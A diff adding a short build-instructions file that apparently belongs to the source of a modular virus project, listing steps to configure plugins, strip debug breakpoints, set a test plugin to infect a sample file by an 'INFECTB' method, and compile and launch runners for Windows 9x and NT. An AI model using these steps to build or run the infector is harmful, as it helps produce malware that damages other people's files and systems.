@@ -1,0 +1,12 @@
+
+  HOW TO BUILD
+  ~~~~~~~~~~~~
+
+  1. edit PLUGIN.LST (setup required list of plugins); disable DEBUG.PGN
+  2. comment all INT 3 commands within all the sources
+  3. enable MAX SB VOLUME set within EFFECT1.ASM
+  4. configure TEST plugin so it will infect sample file using INFECTB method
+  5. verify that "set PGN2_FUCKAPI=Badly" line exactly exists in MAKE_ALL.BAT
+  6. run MAKE_ALL.BAT, i.e. recompile ALL the stuff
+  7. execute RUN_9X.BAT or RUN_NT.BAT from the RUNNER directory
+
